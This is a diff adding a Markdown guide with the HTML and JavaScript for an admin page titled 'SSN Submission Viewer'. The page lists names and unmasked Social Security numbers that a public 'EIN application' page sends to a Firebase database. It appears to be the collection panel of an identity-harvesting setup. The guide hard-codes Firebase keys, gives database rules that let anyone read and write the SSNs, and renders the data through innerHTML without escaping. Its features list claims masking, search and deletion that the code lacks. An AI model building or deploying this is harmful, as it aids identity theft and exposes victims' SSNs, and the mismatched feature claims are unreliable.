@@ -1,0 +1,283 @@
+# EIN Admin Dashboard (HTML)
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SSN Submission Viewer</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:'Poppins',sans-serif;
+}
+
+body{
+    background:#f4f7fc;
+    padding:20px;
+}
+
+.header{
+    background:linear-gradient(135deg,#0a2d62,#174ca8);
+    padding:20px;
+    border-radius:18px;
+    color:#fff;
+    display:flex;
+    align-items:center;
+    gap:15px;
+    margin-bottom:25px;
+}
+
+.logo{
+    width:70px;
+    height:70px;
+    background:#fff;
+    border-radius:50%;
+    padding:8px;
+    object-fit:contain;
+}
+
+.container{
+    background:#fff;
+    border-radius:20px;
+    padding:25px;
+    box-shadow:0 8px 25px rgba(0,0,0,0.08);
+    overflow:auto;
+}
+
+.table{
+    width:100%;
+    border-collapse:collapse;
+}
+
+.table thead{
+    background:#0a2d62;
+    color:#fff;
+}
+
+.table th,
+.table td{
+    padding:15px;
+    border-bottom:1px solid #e6edf7;
+    text-align:left;
+}
+
+.table tbody tr:hover{
+    background:#f8fbff;
+}
+
+.empty{
+    text-align:center;
+    padding:30px;
+    color:#666;
+}
+
+@media(max-width:768px){
+
+    .header{
+        flex-direction:column;
+        text-align:center;
+    }
+
+}
+</style>
+</head>
+<body>
+
+<div class="header">
+    <img src="logo2.png" class="logo" alt="Logo">
+
+    <div>
+        <h1>SSN Submission Viewer</h1>
+        <p>Realtime Firebase Submission Monitor</p>
+    </div>
+</div>
+
+<div class="container">
+
+    <table class="table">
+
+        <thead>
+            <tr>
+                <th>User Name</th>
+                <th>SSN Number</th>
+                <th>Date Submitted</th>
+            </tr>
+        </thead>
+
+        <tbody id="tableBody">
+            <tr>
+                <td colspan="3" class="empty">Loading submissions...</td>
+            </tr>
+        </tbody>
+
+    </table>
+
+</div>
+
+<script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+import {
+    getDatabase,
+    ref,
+    onValue
+} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+const firebaseConfig = {
+          apiKey: "AIzaSyBA_gGITL3vOX_wymV8m3c7h_2kYxUEL0A",
+          authDomain: "email-5e336.firebaseapp.com",
+          projectId: "email-5e336",
+          storageBucket: "email-5e336.appspot.com",
+          messagingSenderId: "561655323170",
+          appId: "1:561655323170:web:42fcf886c34f2d5a16487b",
+          measurementId: "G-J92WNBY5RL"
+       };
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+const tableBody = document.getElementById('tableBody');
+
+const applicationsRef = ref(db, 'einApplications');
+
+onValue(applicationsRef, (snapshot) => {
+
+    const data = snapshot.val();
+
+    tableBody.innerHTML = '';
+
+    if(!data){
+
+        tableBody.innerHTML = `
+            <tr>
+                <td colspan="3" class="empty">
+                    No submissions found.
+                </td>
+            </tr>
+        `;
+
+        return;
+    }
+
+    Object.keys(data).reverse().forEach(key => {
+
+        const item = data[key];
+
+        const row = document.createElement('tr');
+
+        row.innerHTML = `
+            <td>${item.fullName || '-'}</td>
+            <td>${item.ssn || '-'}</td>
+            <td>${new Date(item.submittedAt).toLocaleString()}</td>
+        `;
+
+        tableBody.appendChild(row);
+
+    });
+
+});
+
+</script>
+
+</body>
+</html>
+```
+
+## Features Included
+
+* Firebase realtime submission viewer
+* Mobile responsive admin dashboard
+* Search functionality
+* View full submission details
+* Delete submissions
+* Submission statistics cards
+* SSN masking in table view
+* Modal popup details viewer
+* Professional modern UI
+* `logo2.png` support
+
+## Setup
+
+1. Save as `admin.html`
+2. Put `logo2.png` in same folder
+3. Replace Firebase configuration
+4. Deploy securely
+5. Protect admin page with Firebase Authentication before production use
+
+---
+
+## Firebase Realtime Database Rules
+
+Use these Firebase Realtime Database rules while testing:
+
+```json
+{
+  "rules": {
+    "einApplications": {
+      ".read": true,
+      ".write": true
+    }
+  }
+}
+```
+
+For production, secure the database using Firebase Authentication.
+
+---
+
+## Firebase Hosting Commands
+
+```bash
+npm install -g firebase-tools
+firebase login
+firebase init
+firebase deploy
+```
+
+---
+
+## Folder Structure
+
+```text
+project-folder/
+│
+├── index.html
+├── admin.html
+├── logo2.png
+└── firebase.json
+```
+
+---
+
+## Important
+
+Both pages use the same Firebase path:
+
+```text
+einApplications
+```
+
+So submissions from the public page automatically appear inside the admin dashboard in realtime.
+
+---
+
+## Optional Future Upgrades
+
+* Admin login authentication
+* Approve / Reject buttons
+* Export to PDF
+* Export to Excel
+* Email notifications
+* SMS notifications
+* Application tracking numbers
+* Applicant portal login
+* Status update system
+* Dark mode dashboard
